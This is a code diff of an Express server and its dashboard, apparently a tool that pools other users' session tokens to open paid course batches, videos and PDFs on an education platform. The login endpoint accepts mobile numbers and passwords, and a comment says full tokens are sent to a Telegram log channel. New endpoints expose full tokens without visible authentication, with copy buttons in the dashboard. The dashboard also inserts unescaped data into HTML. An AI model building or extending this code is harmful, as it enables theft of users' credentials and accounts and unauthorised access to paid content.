-  if (to === 'batches') { expState = {batchId:null,batchName:null,subjectId:null,subjectName:null,topicId:null,topicName:null,conceptId:null,conceptName:null}; expSetBreadcrumb(); expShowStep('batches'); }
-  else if (to === 'subjects') { expState.subjectId=null;expState.subjectName=null;expState.topicId=null;expState.topicName=null;expState.conceptId=null;expState.conceptName=null; expSetBreadcrumb(); expShowStep('subjects'); }
-  else if (to === 'topics') { expState.topicId=null;expState.topicName=null;expState.conceptId=null;expState.conceptName=null; expSetBreadcrumb(); expShowStep('topics'); expLoadTopics(); }
-  else if (to === 'concepts') { expState.conceptId=null;expState.conceptName=null; expSetBreadcrumb(); expShowStep('concepts'); expLoadConcepts(); }
-}
-
-function expItemCard(icon, id, name, onclick) {
-  return `<div class="user-card" style="cursor:pointer" onclick="${onclick}">
-    <div class="user-top">
-      <div class="user-avatar" style="font-size:1.2rem;background:var(--surface)">${icon}</div>
-      <div><div class="user-name">${name}</div><div class="user-id">ID: ${id}</div></div>
+  const expiry=b.expiry?new Date(b.expiry).toLocaleDateString('en-IN',{day:'2-digit',month:'short',year:'numeric'}):'';
+  const thumbHtml=b.thumbnail
+    ?`<img class="batch-thumb" src="${b.thumbnail}" alt="" loading="lazy" onerror="this.style.display='none';this.nextSibling.style.display='flex'">`
+    :'';
+  const phDisplay=b.thumbnail?'style="display:none"':'';
+  return `<div class="batch-card">
+    ${thumbHtml}<div class="batch-thumb-ph" ${phDisplay}>📚</div>
+    <div class="batch-info">
+      <div class="batch-id">ID: ${b.id}</div>
+      <div class="batch-name">${b.name||'Unknown Batch'}</div>
+      ${expiry?`<div class="batch-exp"><div class="exp-dot"></div>${expiry}</div>`:''}
     </div>
   </div>`;
 }
 
-async function initExplorer() {
-  expSetBreadcrumb();
-  expShowStep('batches');
-  const grid = document.getElementById('exp-batches-grid');
-  if (expAllBatches.length > 0) { renderExpBatches(); return; }
-  grid.innerHTML = '<div class="loader"><div class="spin"></div> Loading batches...</div>';
+// ── LOAD USERS ───────────────────────────────────────────────────────────────
+async function loadUsers() {
+  const el=document.getElementById('users-container');
+  el.innerHTML='<div class="loader"><div class="spin"></div>Loading users...</div>';
   try {
-    const data = await fetch('/api/all-batches').then(r=>r.json());
-    expAllBatches = data.data || [];
-    renderExpBatches();
-  } catch(e) { grid.innerHTML = '<div class="empty"><div class="empty-icon">⚠️</div><div>Error loading batches.</div></div>'; }
-}
-
-function renderExpBatches() {
-  const q = (document.getElementById('exp-search').value||'').toLowerCase();
-  const list = q ? expAllBatches.filter(b => b.name.toLowerCase().includes(q) || String(b.id).includes(q)) : expAllBatches;
-  const grid = document.getElementById('exp-batches-grid');
-  if (!list.length) { grid.innerHTML = '<div class="empty"><div class="empty-icon">🔍</div><div>No batches found.</div></div>'; return; }
-  grid.innerHTML = list.map(b => {
-    const thumb = b.thumbnail ? `<img class="batch-thumb" src="${b.thumbnail}" alt="${b.name}" loading="lazy" onerror="this.style.display='none';this.nextElementSibling.style.display='flex'">` : '';
-    const ph = `<div class="batch-thumb-placeholder" ${b.thumbnail?'style="display:none"':''}>📚</div>`;
-    return `<div class="batch-card" style="cursor:pointer" onclick="expSelectBatch('${b.id}','${b.name.replace(/'/g,"\\'")}')">
-      ${thumb}${ph}
-      <div class="batch-info">
-        <div class="batch-id">ID: ${b.id}</div>
-        <div class="batch-name">${b.name||'Unknown'}</div>
-      </div>
-    </div>`;
-  }).join('');
-}
-
-function filterExpBatches() { renderExpBatches(); }
-
-async function expSelectBatch(id, name) {
-  expState.batchId = id; expState.batchName = name;
-  expState.subjectId=null;expState.subjectName=null;expState.topicId=null;expState.topicName=null;expState.conceptId=null;expState.conceptName=null;
-  expSetBreadcrumb(); expShowStep('subjects');
-  const grid = document.getElementById('exp-subjects-grid');
-  grid.innerHTML = '<div class="loader"><div class="spin"></div> Loading subjects...</div>';
-  try {
-    const data = await fetch('/api/subjects?courseid='+id).then(r=>r.json());
-    const subs = data.subjects || [];
-    if (!subs.length) { grid.innerHTML = '<div class="empty"><div class="empty-icon">📭</div><div>No subjects found.</div></div>'; return; }
-    grid.innerHTML = subs.map(s => expItemCard('📖', s.id, s.name, `expSelectSubject('${s.id}','${s.name.replace(/'/g,"\\'")}')`) ).join('');
-  } catch(e) { grid.innerHTML = '<div class="empty"><div class="empty-icon">⚠️</div><div>Error: '+e.message+'</div></div>'; }
-}
-
-async function expSelectSubject(id, name) {
-  expState.subjectId = id; expState.subjectName = name;
-  expState.topicId=null;expState.topicName=null;expState.conceptId=null;expState.conceptName=null;
-  expSetBreadcrumb(); expShowStep('topics');
-  await expLoadTopics();
-}
-
-async function expLoadTopics() {
-  const grid = document.getElementById('exp-topics-grid');
-  grid.innerHTML = '<div class="loader"><div class="spin"></div> Loading topics...</div>';
-  try {
-    const data = await fetch('/api/topics?courseid='+expState.batchId+'&subjectid='+expState.subjectId).then(r=>r.json());
-    const topics = data.topics || [];
-    if (!topics.length) { grid.innerHTML = '<div class="empty"><div class="empty-icon">📭</div><div>No topics found.</div></div>'; return; }
-    grid.innerHTML = topics.map(t => expItemCard('📝', t.id, t.name, `expSelectTopic('${t.id}','${t.name.replace(/'/g,"\\'")}')`) ).join('');
-  } catch(e) { grid.innerHTML = '<div class="empty"><div class="empty-icon">⚠️</div><div>Error: '+e.message+'</div></div>'; }
-}
-
-async function expSelectTopic(id, name) {
-  expState.topicId = id; expState.topicName = name;
-  expState.conceptId=null;expState.conceptName=null;
-  expSetBreadcrumb(); expShowStep('concepts');
-  await expLoadConcepts();
-}
-
-async function expLoadConcepts() {
-  const grid = document.getElementById('exp-concepts-grid');
-  grid.innerHTML = '<div class="loader"><div class="spin"></div> Loading concepts...</div>';
-  try {
-    const data = await fetch('/api/concepts?courseid='+expState.batchId+'&subjectid='+expState.subjectId+'&topicid='+expState.topicId).then(r=>r.json());
-    const concepts = data.concepts || [];
-    if (!concepts.length) { grid.innerHTML = '<div class="empty"><div class="empty-icon">📭</div><div>No concepts found.</div></div>'; return; }
-    grid.innerHTML = concepts.map(c => expItemCard('💡', c.id, c.name, `expSelectConcept('${c.id}','${c.name.replace(/'/g,"\\'")}')`) ).join('');
-  } catch(e) { grid.innerHTML = '<div class="empty"><div class="empty-icon">⚠️</div><div>Error: '+e.message+'</div></div>'; }
-}
-
-async function expSelectConcept(id, name) {
-  expState.conceptId = id; expState.conceptName = name;
-  expSetBreadcrumb(); expShowStep('content');
-  const list = document.getElementById('exp-content-list');
-  list.innerHTML = '<div class="loader"><div class="spin"></div> Loading videos & PDFs...</div>';
-  try {
-    const data = await fetch(`/api/videos?courseid=${expState.batchId}&subjectid=${expState.subjectId}&topicid=${expState.topicId}&conceptid=${id}`).then(r=>r.json());
-    const items = data.content || [];
-    if (!items.length) { list.innerHTML = '<div class="empty"><div class="empty-icon">📭</div><div>No content found.</div></div>'; return; }
-    list.innerHTML = items.map(item => {
-      const isVideo = item.type === 'video' || item.player_url;
-      const isPDF = item.pdf_url;
-      const icon = isVideo ? '🎬' : isPDF ? '📄' : '📌';
-      const links = [];
-      if (item.player_url) links.push(`<a href="${item.player_url}" target="_blank" style="color:var(--accent2);font-size:.75rem">▶ Watch</a>`);
-      if (item.pdf_url) links.push(`<a href="${item.pdf_url}" target="_blank" style="color:var(--accent3);font-size:.75rem">📥 PDF</a>`);
-      return `<div class="user-card" style="margin-bottom:8px">
+    const data=await fetch('/api/users').then(r=>r.json());
+    if(!data.users||data.users.length===0){
+      el.innerHTML='<div class="empty"><div class="empty-icon">👥</div><div>No users in pool.</div></div>';
+      return;
+    }
+    const srcCls={manual:'src-manual',telegram:'src-telegram',login:'src-login',api:'src-api',bulk:'src-bulk'};
+    el.innerHTML='<div class="user-list">'+data.users.map((u,i)=>{
+      const av=(u.name||u.userId||'?')[0].toUpperCase();
+      const cls=srcCls[u.source]||'src-api';
+      const addedDate=u.addedAt?new Date(u.addedAt).toLocaleDateString('en-IN'):'—';
+      return `<div class="user-card">
         <div class="user-top">
-          <div class="user-avatar" style="font-size:1.2rem;background:var(--surface)">${icon}</div>
-          <div style="flex:1">
-            <div class="user-name">${item.title||'Untitled'}</div>
-            <div class="user-id">ID: ${item.id} ${item.duration?'• '+item.duration:''}</div>
-          </div>
-          <div style="display:flex;gap:10px;align-items:center">${links.join('')}</div>
+          <div class="user-avatar">${av}</div>
+          <div><div class="user-name">${u.name||'User '+u.userId}</div><div class="user-id">${u.userId}</div></div>
+          <span class="src-badge ${cls}">${u.source||'api'}</span>
         </div>
+        <div class="token-row">
+          <div class="token-text" id="tk-${i}">${u.tokenPreview}</div>
+          <button class="copy-btn" onclick="copyToken(${i},'${u.tokenFull||u.tokenPreview}')">Copy</button>
+        </div>
+        <div class="user-meta">
+          <div class="meta-pill">📚 <strong>${u.batchCount}</strong> batches</div>
+          <div class="meta-pill">📅 <strong>${addedDate}</strong></div>
+          <div class="meta-pill">🔖 <strong>${u.source}</strong></div>
+        </div>
+        <div class="health-bar"><div class="health-fill" style="width:100%"></div></div>
       </div>`;
-    }).join('');
-  } catch(e) { list.innerHTML = '<div class="empty"><div class="empty-icon">⚠️</div><div>Error: '+e.message+'</div></div>'; }
+    }).join('')+'</div>';
+  } catch(e){
+    el.innerHTML='<div class="empty"><div class="empty-icon">⚠️</div><div>Error loading users.</div></div>';
+  }
 }
+
+// ── COPY TOKEN ───────────────────────────────────────────────────────────────
+function copyToken(i, token) {
+  navigator.clipboard.writeText(token).then(()=>{
+    const btn=document.querySelectorAll('.copy-btn')[i];
+    if(btn){btn.textContent='✓ Copied';btn.classList.add('copied');setTimeout(()=>{btn.textContent='Copy';btn.classList.remove('copied')},2000);}
+  }).catch(()=>{
+    const ta=document.createElement('textarea');
+    ta.value=token;document.body.appendChild(ta);ta.select();
+    document.execCommand('copy');document.body.removeChild(ta);
+  });
+}
+
+// ── LOAD TELEGRAM ────────────────────────────────────────────────────────────
+async function loadTelegram() {
+  try {
+    const data=await fetch('/api/telegram-stats').then(r=>r.json());
+    document.getElementById('tg-total').textContent=data.telegram_count||0;
+    document.getElementById('tg-users').textContent=data.telegram_count||0;
+    const tgBatches=data.tokens.reduce((s,t)=>s+t.batchCount,0);
+    document.getElementById('tg-batches').textContent=tgBatches||0;
+    document.getElementById('tg-today').textContent=data.today_logins||0;
+
+    // TG token cards
+    const tcEl=document.getElementById('tg-tokens-container');
+    if(!data.tokens||data.tokens.length===0){
+      tcEl.innerHTML='<div class="empty"><div class="empty-icon">🤖</div><div>No Telegram tokens.</div></div>';
+    } else {
+      tcEl.innerHTML='<div class="user-list">'+data.tokens.map((t,i)=>{
+        const av=(t.userId||'?')[0].toUpperCase();
+        return `<div class="user-card">
+          <div class="user-top">
+            <div class="user-avatar" style="background:linear-gradient(135deg,#00e5ff,#4f8ef7)">${av}</div>
+            <div><div class="user-name">${t.name||'User '+t.userId}</div><div class="user-id">${t.userId}</div></div>
+            <span class="src-badge src-telegram">TG</span>
+          </div>
+          <div class="token-row">
+            <div class="token-text">${t.tokenPreview}</div>
+            <button class="copy-btn" onclick="copyFull('${t.tokenFull||t.tokenPreview}',this)">Copy</button>
+          </div>
+          <div class="user-meta">
+            <div class="meta-pill">📚 <strong>${t.batchCount}</strong> batches</div>
+            <div class="meta-pill">📅 ${t.addedAt?new Date(t.addedAt).toLocaleDateString('en-IN'):'—'}</div>
+          </div>
+        </div>`;
+      }).join('')+'</div>';
+    }
+
+    // Logs
+    const logsEl=document.getElementById('tg-logs-container');
+    if(!data.logs||data.logs.length===0){
+      logsEl.innerHTML='<div class="empty"><div class="empty-icon">📋</div><div>No logs yet. Koi login kare tab dikhega.</div></div>';
+    } else {
+      const srcCls={telegram:'src-telegram',id_pass:'src-api',manual:'src-manual',website:'src-login'};
+      const srcLabel={telegram:'TG Bot',id_pass:'ID+Pass',manual:'Manual',website:'Website'};
+      logsEl.innerHTML='<div class="log-feed">'+[...data.logs].reverse().map(l=>{
+        const t=new Date(l.timestamp);
+        const timeStr=t.toLocaleTimeString('en-IN',{hour:'2-digit',minute:'2-digit'})+' '+t.toLocaleDateString('en-IN',{day:'2-digit',month:'short'});
+        const cls=srcCls[l.source]||'src-login';
+        return `<div class="log-entry source-${l.source}">
+          <div class="log-top">
+            <span class="log-uid">${l.userId}</span>
+            <span class="src-badge ${cls}" style="font-size:.55rem">${srcLabel[l.source]||l.source}</span>
+            <span class="log-time">${timeStr}</span>
+          </div>
+          <div class="log-token">${l.tokenPreview}</div>
+          <div class="log-batches">📚 ${l.batchCount} batches ${l.extraInfo?'• '+l.extraInfo:''}</div>
+        </div>`;
+      }).join('')+'</div>';
+    }
+  } catch(e){
+    document.getElementById('tg-tokens-container').innerHTML='<div class="empty"><div class="empty-icon">⚠️</div><div>Error loading Telegram data.</div></div>';
+  }
+}
+
+// ── COPY FULL ────────────────────────────────────────────────────────────────
+function copyFull(token, btn) {
+  navigator.clipboard.writeText(token).then(()=>{
+    btn.textContent='✓ Copied';btn.classList.add('copied');
+    setTimeout(()=>{btn.textContent='Copy';btn.classList.remove('copied')},2000);
+  });
+}
+
+// ── LOAD HEALTH ──────────────────────────────────────────────────────────────
+async function loadHealth() {
+  const el=document.getElementById('health-container');
+  el.innerHTML='<div class="loader"><div class="spin"></div>Loading health...</div>';
+  try {
+    const data=await fetch('/api/health').then(r=>r.json());
+    if(!data.health||data.health.length===0){
+      el.innerHTML='<div class="empty"><div class="empty-icon">💓</div><div>No tokens in pool.</div></div>';
+      return;
+    }
+    el.innerHTML='<div class="health-grid">'+data.health.map(h=>{
+      const clr=h.failures===0?'var(--green)':h.failures<3?'var(--yellow)':'var(--red)';
+      const w=Math.max(0,100-h.failures*34);
+      const icon=h.failures===0?'🟢':h.failures<3?'🟡':'🔴';
+      return `<div class="health-card">
+        <div class="health-top">
+          <div class="health-status-icon" style="background:${clr}22">${icon}</div>
+          <div style="flex:1">
+            <div style="font-size:.85rem;font-weight:700;color:var(--text)">${h.name||'User '+h.userId}</div>
+            <div style="font-size:.68rem;color:var(--muted)">${h.userId}</div>
+          </div>
+          <span class="src-badge" style="color:${clr};border-color:${clr}33;background:${clr}11">${h.status}</span>
+        </div>
+        <div class="health-meta">
+          <span>❌ Failures: <strong style="color:${clr}">${h.failures}/3</strong></span>
+          <span>Source: ${h.source}</span>
+        </div>
+        <div class="health-bar"><div class="health-fill" style="width:${w}%;background:${clr}"></div></div>
+      </div>`;
+    }).join('')+'</div>';
+  } catch(e){
+    el.innerHTML='<div class="empty"><div class="empty-icon">⚠️</div><div>Error loading health.</div></div>';
+  }
+}
+
+// ── TRY API ──────────────────────────────────────────────────────────────────
+async function tryApi(url, method, body) {
+  const cleanUrl=url.replace('/api/','').replace(/[?&=]/g,'-').replace(/\//g,'-');
+  const respEl=document.getElementById('resp-'+cleanUrl) || 
+    document.querySelector('.api-response:not(.visible)') ||
+    (() => { const d=document.createElement('div');d.className='api-response';return d; })();
+  if(respEl){
+    respEl.classList.add('visible');
+    respEl.textContent='Loading...';
+  }
+  try {
+    const opts={method,headers:{'Content-Type':'application/json'}};
+    if(body&&method==='POST') opts.body=JSON.stringify(body);
+    const r=await fetch(url,opts);
+    const json=await r.json();
+    if(respEl) respEl.textContent=JSON.stringify(json,null,2);
+  } catch(e){
+    if(respEl) respEl.textContent='Error: '+e.message;
+  }
+}
+
+// Find response divs by endpoint
+document.querySelectorAll('.try-btn').forEach(btn=>{
+  btn.addEventListener('click',function(){
+    let resp=this.nextElementSibling;
+    if(resp&&resp.classList.contains('api-response')){
+      resp.classList.toggle('visible');
+    }
+  });
+});
 
 // ── BOOT ─────────────────────────────────────────────────────────────────────
 initStats();
 loadBatches();
-// Auto-refresh stats every 60s
-setInterval(initStats, 60000);
+setInterval(initStats, 30000);
 </script>
 </body>
 </html>`);
@@ -973,15 +1104,36 @@ setInterval(initStats, 60000);
 // ══════════════════════════════════════════════════════════════════════════════
 app.get("/api/status", (req, res) => {
   res.json({
-    status: "RG-MAXX API v5 Online",
-    version: "v5",
+    status: "RG-MAXX API v10 Online",
+    version: "v10",
     tokens: getTokenCount(),
-    manual_users_defined: MANUAL_USERS.filter(
-      (u) => u.token && !u.token.startsWith("TOKEN_")
-    ).length,
+    manual_users_defined: MANUAL_USERS.filter(u => u.token && !u.token.startsWith("TOKEN_")).length,
     telegram_bot: !!process.env.TELEGRAM_BOT_TOKEN,
     telegram_channel: !!process.env.TELEGRAM_LOG_CHANNEL_ID,
     keepalive: "active",
+    features: ["full-token-logs", "auto-batch-add", "telegram-stats", "today-counter"],
+  });
+});
+
+// ══════════════════════════════════════════════════════════════════════════════
+// TELEGRAM STATS — New endpoint
+// ══════════════════════════════════════════════════════════════════════════════
+app.get("/api/telegram-stats", (req, res) => {
+  const tgTokens = getTelegramTokens();
+  const logs = getLogHistory();
+  res.json({
+    telegram_count: tgTokens.length,
+    today_logins: getTodayLoginCount(),
+    tokens: tgTokens.map(t => ({
+      userId: t.userId,
+      name: t.name || "",
+      batchCount: t.batches.length,
+      tokenPreview: t.token.substring(0, 40) + "...",
+      tokenFull: t.token,
+      addedAt: t.addedAt,
+      source: t.source,
+    })),
+    logs,
   });
 });
 
@@ -990,12 +1142,11 @@ app.get("/api/status", (req, res) => {
 // ══════════════════════════════════════════════════════════════════════════════
 app.get("/api/health", (req, res) => {
   const health = getTokenHealth();
-  const healthy = health.filter((h) => h.failures === 0).length;
   res.json({
     total: health.length,
-    healthy,
-    warning: health.filter((h) => h.failures > 0 && h.failures < 3).length,
-    dead: health.filter((h) => h.failures >= 3).length,
+    healthy: health.filter(h => h.failures === 0).length,
+    warning: health.filter(h => h.failures > 0 && h.failures < 3).length,
+    dead: health.filter(h => h.failures >= 3).length,
     health,
   });
 });
@@ -1004,21 +1155,21 @@ app.get("/api/health", (req, res) => {
 // USERS
 // ══════════════════════════════════════════════════════════════════════════════
 app.get("/api/users", (req, res) => {
-  const users = getAllTokens().map((t) => ({
+  const users = getAllTokens().map(t => ({
     userId: t.userId,
     name: t.name || "",
     source: t.source || "unknown",
     batchCount: t.batches.length,
-    batches: t.batches.map((b) => ({ id: b.id, name: b.name, expiry: b.expiry || "" })),
+    batches: t.batches.map(b => ({ id: b.id, name: b.name, expiry: b.expiry || "" })),
     addedAt: t.addedAt,
     updatedAt: t.updatedAt,
-    tokenPreview: t.token.substring(0, 20) + "...",
-    fullToken: t.token,
+    tokenPreview: t.token.substring(0, 40) + "...",
+    tokenFull: t.token,
   }));
   res.json({
     total: users.length,
-    manual: users.filter((u) => u.source === "manual").length,
-    dynamic: users.filter((u) => u.source !== "manual").length,
+    manual: users.filter(u => u.source === "manual").length,
+    dynamic: users.filter(u => u.source !== "manual").length,
     users,
   });
 });
@@ -1031,38 +1182,27 @@ app.get("/api/reload-users", async (req, res) => {
   if (process.env.ADMIN_SECRET && secret !== process.env.ADMIN_SECRET) {
     return res.status(403).json({ error: "Forbidden" });
   }
-
   const valid = MANUAL_USERS.filter(
-    (u) =>
-      u.userId &&
-      u.token &&
-      !(u.token.startsWith("TOKEN_") && u.token.endsWith("_YAHAN_PASTE_KARO"))
+    u => u.userId && u.token && !(u.token.startsWith("TOKEN_") && u.token.endsWith("_YAHAN_PASTE_KARO"))
   );
-  const skippedPlaceholders = MANUAL_USERS.length - valid.length;
-
-  // Parallel load — sab ek saath
   const settled = await Promise.allSettled(
-    valid.map(async (u) => {
+    valid.map(async u => {
+      // ✅ Auto batch fetch on reload too
       const batches = await fetchUserBatches(u.userId, u.token);
       addToken(u.userId, u.token, u.name || "", batches, "manual");
       return { userId: u.userId, name: u.name, status: "loaded", batchCount: batches.length };
     })
   );
-
   const results = settled.map((r, i) =>
-    r.status === "fulfilled"
-      ? r.value
-      : { userId: valid[i]?.userId, name: valid[i]?.name, status: "error", error: r.reason?.message || String(r.reason) }
+    r.status === "fulfilled" ? r.value
+      : { userId: valid[i]?.userId, status: "error", error: r.reason?.message || String(r.reason) }
   );
-
-  const loaded = results.filter((r) => r.status === "loaded").length;
-  const skipped = skippedPlaceholders + results.filter((r) => r.status === "error").length;
-
-  res.json({ success: true, loaded, skipped, totalInPool: getTokenCount(), results });
+  const loaded = results.filter(r => r.status === "loaded").length;
+  res.json({ success: true, loaded, totalInPool: getTokenCount(), results });
 });
 
 // ══════════════════════════════════════════════════════════════════════════════
-// LOGIN — v5: ID+Password OR userId+token
+// LOGIN
 // ══════════════════════════════════════════════════════════════════════════════
 app.post("/api/login", async (req, res) => {
   try {
@@ -1081,26 +1221,19 @@ app.post("/api/login", async (req, res) => {
       finalUserId = String(userId);
       finalToken = String(token);
     } else {
-      return res.status(400).json({
-        success: false,
-        error: "Send { mobile, password } OR { userId, token }",
-      });
+      return res.status(400).json({ success: false, error: "Send { mobile, password } OR { userId, token }" });
     }
 
+    // ✅ Auto fetch batches on login
     const batches = await fetchUserBatches(finalUserId, finalToken);
     addToken(finalUserId, finalToken, "", batches, "login");
 
     const source = (mobile && password) ? "id_pass" : "website";
     const extra = (mobile && password) ? mobile : "";
+    // ✅ Full token sent to Telegram
     await sendLog(buildLoginLog(finalUserId, finalToken, batches, source, extra));
 
-    res.json({
-      success: true,
-      userId: finalUserId,
-      batchCount: batches.length,
-      batches,
-      message: "Token added. Content accessible.",
-    });
+    res.json({ success: true, userId: finalUserId, batchCount: batches.length, batches, message: "Token added. Auto batches fetched." });
   } catch (err) {
     res.status(500).json({ success: false, error: err.message });
   }
@@ -1129,16 +1262,13 @@ app.post("/api/bulk-login", async (req, res) => {
   try {
     const users = Array.isArray(req.body) ? req.body : [];
     if (users.length === 0) return res.status(400).json({ error: "Send array: [{userId, token}, ...]" });
-
-    // Parallel batch fetch for all users
     const results = await Promise.allSettled(
-      users.filter(u => u.userId && u.token).map(async (u) => {
-        const batches = await fetchUserBatches(String(u.userId), String(u.token));
-        addToken(String(u.userId), String(u.token), u.name || "", batches, "bulk");
+      users.filter(u => u.userId && u.token).map(async u => {
+        const batches = await fetchUserBatches(u.userId, u.token);
+        addToken(u.userId, u.token, u.name || "", batches, "bulk");
         return { userId: u.userId, batchCount: batches.length };
       })
     );
-
     const added = results.filter(r => r.status === "fulfilled").length;
     res.json({ success: true, added, total: getTokenCount() });
   } catch (err) {
@@ -1147,7 +1277,7 @@ app.post("/api/bulk-login", async (req, res) => {
 });
 
 // ══════════════════════════════════════════════════════════════════════════════
-// REMOVE TOKEN
+// REMOVE / POOL / CLEAR
 // ══════════════════════════════════════════════════════════════════════════════
 app.get("/api/remove-token", (req, res) => {
   const { userid } = req.query;
@@ -1155,26 +1285,17 @@ app.get("/api/remove-token", (req, res) => {
   res.json({ success: removeToken(userid), userId: userid });
 });
 
-// ══════════════════════════════════════════════════════════════════════════════
-// POOL
-// ══════════════════════════════════════════════════════════════════════════════
 app.get("/api/pool", (req, res) => {
-  const users = getAllTokens().map((t) => ({
-    userId: t.userId,
-    name: t.name || "",
-    source: t.source,
+  const users = getAllTokens().map(t => ({
+    userId: t.userId, name: t.name || "", source: t.source,
     batchCount: t.batches.length,
-    batchNames: t.batches.map((b) => `[${b.id}] ${b.name}`),
+    batchNames: t.batches.map(b => `[${b.id}] ${b.name}`),
     addedAt: t.addedAt,
-    tokenPreview: t.token.substring(0, 25) + "...",
-    fullToken: t.token,
+    tokenPreview: t.token.substring(0, 30) + "...",
   }));
   res.json({ total: users.length, users });
 });
 
-// ══════════════════════════════════════════════════════════════════════════════
-// CLEAR POOL
-// ══════════════════════════════════════════════════════════════════════════════
 app.get("/api/clear-pool", (req, res) => {
   const { secret } = req.query;
   if (process.env.ADMIN_SECRET && secret !== process.env.ADMIN_SECRET) {
@@ -1184,7 +1305,7 @@ app.get("/api/clear-pool", (req, res) => {
 });
 
 // ══════════════════════════════════════════════════════════════════════════════
-// ALL BATCHES — combined, thumbnail included, no duplicates
+// ALL BATCHES
 // ══════════════════════════════════════════════════════════════════════════════
 app.get("/api/all-batches", async (req, res) => {
   try {
@@ -1192,17 +1313,12 @@ app.get("/api/all-batches", async (req, res) => {
     if (tokens.length === 0) {
       return res.json({ status: 200, total: 0, data: [], message: "No tokens in pool" });
     }
-
     const batchMap = new Map();
-
     await Promise.allSettled(
-      tokens.map(async (entry) => {
+      tokens.map(async entry => {
         try {
           const headers = makeHeaders(entry.token, entry.userId);
-          const resp = await fetch(
-            `${BASE_URL}/get/get_all_purchases?userid=${entry.userId}`,
-            { headers, timeout: 10000 }
-          );
+          const resp = await fetch(`${BASE_URL}/get/get_all_purchases?userid=${entry.userId}`, { headers });
           if (!resp.ok) return;
           const data = await resp.json();
           for (const item of data.data || []) {
@@ -1211,8 +1327,7 @@ app.get("/api/all-batches", async (req, res) => {
               const id = String(c.id);
               if (!batchMap.has(id)) {
                 batchMap.set(id, {
-                  id,
-                  name: c.course_name,
+                  id, name: c.course_name,
                   thumbnail: c.course_thumbnail || "",
                   expiry: item.enddatetime || "",
                 });
@@ -1222,7 +1337,6 @@ app.get("/api/all-batches", async (req, res) => {
         } catch (_) {}
       })
     );
-
     const masterList = Array.from(batchMap.values());
     res.json({ status: 200, total: masterList.length, data: masterList });
   } catch (err) {
@@ -1241,9 +1355,8 @@ app.get("/api/my-courses", async (req, res) => {
     const headers = makeHeaders(entry.token, entry.userId);
     const resp = await fetch(`${BASE_URL}/get/mycourseweb?userid=${entry.userId}`, { headers });
     const data = await resp.json();
-    const courses = (data.data || []).map((c) => ({
-      id: c.id, name: c.course_name,
-      thumbnail: c.course_thumbnail, expiry: c.expiryDate, is_paid: c.is_paid,
+    const courses = (data.data || []).map(c => ({
+      id: c.id, name: c.course_name, thumbnail: c.course_thumbnail, expiry: c.expiryDate, is_paid: c.is_paid,
     }));
     res.json({ total: courses.length, courses });
   } catch (err) {
@@ -1364,34 +1477,18 @@ app.use((req, res) => {
 });
 
 // ══════════════════════════════════════════════════════════════════════════════
-// VERCEL-SAFE STARTUP
-// Vercel = serverless (stateless). app.listen() kaam nahi karta.
-// Isliye lazy init: pehli request aane par users load hote hain.
+// START
 // ══════════════════════════════════════════════════════════════════════════════
-
-async function ensureInitialized() {
-  if (_initialized) return;
-  if (_initPromise) return _initPromise;
-  _initPromise = loadManualUsers().then(() => {
-    _initialized = true;
-    _initPromise = null;
-    // KeepAlive only on non-serverless (local/Railway/Render)
-    if (process.env.PORT) startKeepAlive();
-  });
-  return _initPromise;
-}
-
-// Local server start (Vercel pe ye block run nahi hota — export default use karta hai)
 const PORT = process.env.PORT || 3000;
-if (process.env.NODE_ENV !== "production" || process.env.FORCE_LISTEN === "1") {
-  loadManualUsers().then(() => {
-    app.listen(PORT, () => {
-      console.log(`✅ RG-MAXX API v8 on port ${PORT}`);
-      console.log(`📖 Dashboard: http://localhost:${PORT}/`);
-      console.log(`🤖 Telegram: ${process.env.TELEGRAM_BOT_TOKEN ? "configured ✅" : "NOT configured ❌"}`);
-    });
-    startKeepAlive();
+
+loadManualUsers().then(() => {
+  app.listen(PORT, () => {
+    console.log(`✅ RG-MAXX API v10 on port ${PORT}`);
+    console.log(`📖 Dashboard: http://localhost:${PORT}/`);
+    console.log(`🤖 Telegram: ${process.env.TELEGRAM_BOT_TOKEN ? "configured ✅" : "NOT configured ❌"}`);
+    console.log(`✨ Features: Full token logs | Auto batch add | Telegram stats`);
   });
-}
+  startKeepAlive();
+});
 
 export default app;
